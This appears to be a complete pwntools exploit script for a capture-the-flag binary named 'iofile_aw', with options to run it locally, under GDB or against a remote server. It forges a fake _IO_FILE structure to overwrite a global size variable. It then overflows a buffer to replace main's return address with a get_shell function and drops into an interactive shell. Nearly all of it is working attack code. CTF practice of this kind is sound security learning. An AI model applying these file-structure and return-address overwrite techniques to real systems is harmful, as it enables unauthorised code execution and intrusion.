from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './iofile_aw'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
r = start()
sl = r.sendline
sa = r.sendafter

get_shell = 0x4009fa  # get_shell()
buf = 0x602040  # global var <buf>
size = 0x602010  # global var <size>


# overwrite size with 0x1000

payload = p64(0xfbad208b)  # flag
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(0)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(size)  # _IO_buf_base

r.sendafter('# ', b'printf ' + payload)

r.sendafter('# ', 'read\x00')
r.sendline(p64(0x1000))


# overwrite return address of main() with get_shell()

r.sendafter('# ', b'exit\x00'.ljust(0x228, b'a') + p64(get_shell))


r.interactive()
